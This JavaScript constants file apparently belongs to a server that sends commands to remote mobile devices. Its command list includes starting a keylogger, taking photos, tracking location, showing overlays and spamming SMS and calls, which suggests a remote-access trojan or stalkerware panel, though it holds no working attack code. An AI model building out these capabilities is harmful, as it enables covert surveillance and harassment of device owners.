module.exports = {
  // User roles
  USER_ROLES: {
    SUPER_ADMIN: 'super_admin',
    ADMIN: 'admin',
    USER: 'user',
    VIEWER: 'viewer'
  },
  
  // Device status
  DEVICE_STATUS: {
    PENDING: 'pending',
    ACTIVE: 'active',
    INACTIVE: 'inactive',
    BLOCKED: 'blocked',
    DELETED: 'deleted'
  },
  
  // Command status
  COMMAND_STATUS: {
    PENDING: 'pending',
    SENT: 'sent',
    PROCESSING: 'processing',
    COMPLETED: 'completed',
    FAILED: 'failed',
    CANCELLED: 'cancelled',
    EXPIRED: 'expired'
  },
  
  // Alert severity
  ALERT_SEVERITY: {
    INFO: 'info',
    WARNING: 'warning',
    CRITICAL: 'critical',
    EMERGENCY: 'emergency'
  },
  
  // Alert status
  ALERT_STATUS: {
    ACTIVE: 'active',
    ACKNOWLEDGED: 'acknowledged',
    RESOLVED: 'resolved'
  },
  
  // Command types
  COMMAND_TYPES: {
    OPEN_WEB: 'OPEN_WEB',
    TAKE_PHOTO: 'TAKE_PHOTO',
    START_KEYLOGGER: 'START_KEYLOGGER',
    STOP_KEYLOGGER: 'STOP_KEYLOGGER',
    GET_LOCATION: 'GET_LOCATION',
    LOCK_DEVICE: 'LOCK_DEVICE',
    UNLOCK_DEVICE: 'UNLOCK_DEVICE',
    SHOW_OVERLAY: 'SHOW_OVERLAY',
    HIDE_OVERLAY: 'HIDE_OVERLAY',
    SEND_NOTIFICATION: 'SEND_NOTIFICATION',
    MAKE_CALL: 'MAKE_CALL',
    SEND_SMS: 'SEND_SMS',
    SPAM_SMS: 'SPAM_SMS',
    SPAM_CALL: 'SPAM_CALL',
    SEND_WHATSAPP: 'SEND_WHATSAPP',
    SET_BRIGHTNESS: 'SET_BRIGHTNESS',
    SET_VOLUME: 'SET_VOLUME',
    SET_SILENT_MODE: 'SET_SILENT_MODE',
    TOGGLE_WIFI: 'TOGGLE_WIFI',
    TOGGLE_BLUETOOTH: 'TOGGLE_BLUETOOTH',
    TOGGLE_AIRPLANE_MODE: 'TOGGLE_AIRPLANE_MODE',
    VIBRATE: 'VIBRATE',
    SHOW_TOAST: 'SHOW_TOAST',
    TEXT_TO_SPEECH: 'TEXT_TO_SPEECH',
    SET_WALLPAPER: 'SET_WALLPAPER',
    PLAY_MUSIC: 'PLAY_MUSIC'
  },
  
  // HTTP status codes
  HTTP_STATUS: {
    OK: 200,
    CREATED: 201,
    BAD_REQUEST: 400,
    UNAUTHORIZED: 401,
    FORBIDDEN: 403,
    NOT_FOUND: 404,
    CONFLICT: 409,
    TOO_MANY_REQUESTS: 429,
    INTERNAL_SERVER_ERROR: 500
  },
  
  // Error messages
  ERROR_MESSAGES: {
    UNAUTHORIZED: 'Authentication required',
    FORBIDDEN: 'Insufficient permissions',
    NOT_FOUND: 'Resource not found',
    VALIDATION_ERROR: 'Validation error',
    INTERNAL_ERROR: 'Internal server error',
    DEVICE_OFFLINE: 'Device is offline',
    INVALID_PIN: 'Invalid PIN',
    PIN_EXPIRED: 'PIN has expired',
    DEVICE_NOT_FOUND: 'Device not found'
  }
};
